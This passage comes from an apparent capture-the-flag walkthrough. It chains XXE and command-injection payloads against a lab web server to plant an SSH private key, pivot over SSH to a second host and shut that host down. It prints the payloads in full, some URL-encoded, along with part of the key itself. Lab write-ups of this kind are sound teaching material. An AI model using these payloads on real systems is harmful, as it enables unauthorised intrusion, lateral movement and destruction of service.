pIfUI97CAvAiXb1nyVlrr19pMFWZjIR/9ht3hDQsCmNEMKyYyTAM2PE5U7hH/yJ6m5AAAA
wBgYxV1hWXcIgSW4Sm/iwR6F9Zvfbl4yYipI+a0IxU/2pEFNONbTzX9t8VhQ/gMgTVbwNL
ih6EGctNGRh8gEzkt0PXSFT8EZsg94/eD4KPYizlhrgvZtgkQh79euVWSGhAYm/ABvwEwB
u5Qth4Ez2Jd1skqwls/Ayht7mIrqQmpv3Iz0/vPWwFOhoqd8hJ6U2IwnF8EZjgCSSDGdP/
/v0YSLVFJ+D46ERZyhXKbVf0NrU4F+hnhjZjzKeMRBdQfCfgAAAMEA6l98n0fUNL+D3hEf
4BU4u4pET7NvPOJ+/vOrhAW5I/LdqBEHOShaesomPLqMzttLYl2RrTAsFBus2WH/liZgYd
XiB1soXRn5lXQWfDZCDAzBHMppmllSGP4ip9dzhc8nmFNBoa/+E+hALFhgT8mnDIsYsXmo
ant39nHmwG+v/3CT7naemuoRo7S20ejsFP30wd5WnKv14DxWyTw6YBqKhrJ5449gG2s2Dk
G1v4aCnSmD5MlLLSU2kw0mU17Z3MyDAAAAwQDE5SrrCOv9+K4qPVDaxclh1FdiEX6VmAzV
hxNcxYiFdjqYvFcq6NJB7mkiIoRaPh5R6bsicMjc0ZFBshqgNFt81G0kETmF5/GV2tTqt1
qFHwtG/87KmN3t4QYiDg4Q1ovVy5TYSkvPSlJu+kjFB0CGfAylpM+xtQeXQeUTcvi6ct8s
Tg4VJ42ut7u3FjxP5pp/8INsN21Yumcb6rVoQ+b1VSWvSKkbnL/sEhgbUlMidT1m7lU/id
K1SqDST/D4FMMAAAAKdXNlckBib3gtMgE=" >> id_rsa" >]>
<entry>
	<email>&xxe;</email>
</entry>
```

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.10.10.175/index.php?tips=Tip-1;echo "-----END OPENSSH PRIVATE KEY-----" >> id_rsa" >]>
<entry>
	<email>&xxe;</email>
</entry>
```


3. You can verify if the file exists by performing an `ls -la` command from within the payload. We can see the file is currently in our directory. You can also read the file to make sure you wrote the key correctly (we are skipping this step since we are sure we sent the payloads correctly)

![img-32](./img/img-32.png)

4. It is important to notice that the permissions for the `id_rsa` file are `-rw-r--r--`. SSH keys need permissions of `600` in order for the SSH key to work. You can use the payload below to change the permissions of the file: 

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.10.10.175/index.php?tips=Tip-1;%63%68%6d%6f%64%20%36%30%30%20%69%64%5f%72%73%61" >]>
<entry>
	<email>&xxe;</email>
</entry>
```

The payload above is performing the following: 
```
chmod 600 id_rsa
```

5. Once you perform this, we can attempt to ssh into the `IP` we found (`20.20.20.53`). Encode the following and add it to your payload like below. 

```
ssh -i id_rsa -o StrictHostKeyChecking=no user@20.20.20.53 whoami 2>&1
```

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.10.10.175/index.php?tips=Tip-1;%73%73%68%20%2d%69%20%69%64%5f%72%73%61%20%2d%6f%20%53%74%72%69%63%74%48%6f%73%74%4b%65%79%43%68%65%63%6b%69%6e%67%3d%6e%6f%20%75%73%65%72%40%32%30%2e%32%30%2e%32%30%2e%35%33%20%77%68%6f%61%6d%69%20%32%3e%26%31" >]>
<entry>
	<email>&xxe;</email>
</entry>
```

6. Way to go! You have `user` access to the `20.20.20.53` system. 

![img-33](./img/img-33.png)

7. Let's modify the payload once again to read this new system's IPs. Here is the modified payload (you will need to encode it):

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.10.10.175/index.php?tips=Tip-1;ssh -i id_rsa user@20.20.20.53 cat /proc/net/fib_trie 2>&1" >]>
<entry>
	<email>&xxe;</email>
</entry>
```

![img-34](./img/img-34.png)

8. Look at that! You have obtained access to the `10.5.5.59` system, which means, you obtained access to the `orange-glory` system just like required. Lets do one more recap of what happened throughout the challenge: 
- You had read access to the `space-guide` system and developed a script to find other hosted sites in the `10.10.10.0/24` network. 
- Using the script, you found a website hosted on another system, `space-tips` with IP `10.10.10.175` that was vulnerable to command injection. You also found another IP, `20.20.20.20`.
- By performing command injections on the `space-tips` system, you found a third system which ended up being the `orange-glory` system. 
- To pivot from `space-tips` to `orange-glory`, you took advantage of an SUID permission on the `grep` command and used it to read the `employee_list.txt` file and to get access to an SSH key found in the system. 
- You used the SSH key to gain access to the `orange-glory`. 
- You did all of this by just having read access to the `space-guide` system. Way to go!


9. Final step is to shut down the Orange Glory website. In this case, we are going to attempt a very straight-forward approach... literally shutting down the system. This is the payload we used:

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.10.10.175/index.php?tips=Tip-1;%73%73%68%20%2d%69%20%69%64%5f%72%73%61%20%75%73%65%72%40%32%30%2e%32%30%2e%32%30%2e%35%33%20%73%75%64%6f%20%73%68%75%74%64%6f%77%6e%20%2d%68%20%6e%6f%77%20%32%3e%26%31" >]>
<entry>
	<email>&xxe;</email>
</entry>
```
![img-35](./img/img-35.png)

10. Once you hit enter, you'll notice you don't receive any response. Let's head to `https://challenge.us` to see if we received our last token. 

![img-36](./img/img-36.png)

You have obtained all three tokens! Congrats!
